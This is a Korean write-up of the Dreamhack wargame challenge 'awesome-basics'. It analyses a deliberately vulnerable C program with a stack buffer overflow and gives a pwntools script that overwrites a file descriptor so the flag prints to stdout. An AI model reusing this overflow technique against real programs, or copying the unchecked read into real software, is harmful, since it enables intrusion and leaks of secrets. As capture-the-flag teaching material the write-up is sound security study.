# Level1:awesome-basics

## 문제 링크

---

https://dreamhack.io/wargame/challenges/835

## Description

---

**Stack Buffer Overflow 취약점이 존재하는 프로그램입니다. 주어진 바이너리와 소스 코드를 분석하여 익스플로잇하고 플래그를 획득하세요! 플래그는 `flag` 파일에 있습니다.**

**플래그의 형식은 DH{...} 입니다.**

## Environment

---

![스크린샷 2025-02-06 오후 9.36.33.png](Level1%20awesome-basics%2024a8bcdf2bea43898f56358bf5082649/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA_2025-02-06_%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE_9.36.33.png)

## Background

---

- BOF

## 코드 분석

---

### code

- 아래는 문제에서 제공하는 `chall.c` 이다.

```purescript
// Name: chall.c
// Compile: gcc -zexecstack -fno-stack-protector chall.c -o chall

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>

#define FLAG_SIZE 0x45

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

char *flag;

int main(int argc, char *argv[]) {
    int stdin_fd = 0;
    int stdout_fd = 1;
    int flag_fd;
    int tmp_fd;
    **char buf[80];**

    initialize();

    // read flag
    flag = (char *)malloc(FLAG_SIZE);
    flag_fd = open("./flag", O_RDONLY);
    read(flag_fd, flag, FLAG_SIZE);
    close(flag_fd);

    tmp_fd = open("./tmp/flag", O_WRONLY);

    write(stdout_fd, "Your Input: ", 12);
    **read(stdin_fd, buf, 0x80);**

    write(tmp_fd, flag, FLAG_SIZE);
    write(tmp_fd, buf, 80);
    close(tmp_fd);

    return 0;
}
```

- `buf` 를 `char buf[80]` 으로 선언 후, `read` 에서 `0x80` 만큼 입력받는다. → BOF

- 위 코드는 `./flag` 를 읽어 `tmp_fd` 가 가리키는 `./tmp/flag` 에 플래그 값을 저장한다.
- 쉘을 획득해서 `./flag` 또는 `./tmp/flag` 를 읽는 방법을 생각해볼 수 있다.
    - 그러나 one gadget, ROP 를 사용하려면 `libc base` 를 구해야 하기 때문에 복잡하다.
    - 또한 한 번의 입력으로 `libc base` 를 구한 후, 쉘을 획득하는 것은 불가능하다.
    - `code base` 를 구해서 Ret2main을 구현해야 하는데… 번거롭다.

- **`tmp_fd` 가 가리키는 값을 `stdout` 으로 덮어씌워 `./tmp/flag` 가 아니라 `stdout` 에 플래그를 출력하도록 하는 방법이 있다.**

### gdb

- `buf` 와 `tmp_fd` 의 상대적인 위치 차이를 계산하여 `tmp_fd` 의 값을 `1` (`stdout`) 으로 덮어씌운다.
- 해당하는 부분을 `gdb` 로 분석하면 아래와 같다.

![스크린샷 2025-02-06 오후 9.47.20.png](Level1%20awesome-basics%2024a8bcdf2bea43898f56358bf5082649/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA_2025-02-06_%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE_9.47.20.png)

![스크린샷 2025-02-06 오후 9.50.12.png](Level1%20awesome-basics%2024a8bcdf2bea43898f56358bf5082649/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA_2025-02-06_%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE_9.50.12.png)

- `read(stdin_fd, buf, 0x80)` 에 해당하는 부분은 `<main+176> ~ <main+193>`
- `write(tmp_fd, flag, FLAG_SIZE)` 에 해당하는 부분은 `<main+198> ~ <main+218>` 이다.

- `x86-64` 함수 호출 규약에 의해 `buf` 에 해당하는 값은 `rsi` 값인 `[rbp-0x60]` , `tmp_fd` 에 해당하는 값은 `rdi` 값인 `[rbp-0x10]` 임을 알 수 있다.
- `buf` 에는 `0x80` 만큼의 입력을 받을 수 있으므로 `tmp_fd` 를 덮어쓸 수 있다.

## 익스플로잇

---

### 익스플로잇 단계

- BOF를 이용하여 `tmp_fd` 의 값을 `1` 로 설정한다.
    - `stdin` : `0`
    - `stdout` : `1`
    - `stderr` : `2`

### exploit.py

```purescript
from pwn import *

e = ELF('./chall')
# p = e.process()
p = remote('host1.dreamhack.games', 14624)
context.log_level ='debug'

payload = b'A' * 0x50 + p64(1)

p.sendlineafter(b'Your Input: ', payload)

p.interactive()
```

![스크린샷 2025-02-06 오후 9.54.58.png](Level1%20awesome-basics%2024a8bcdf2bea43898f56358bf5082649/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA_2025-02-06_%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE_9.54.58.png)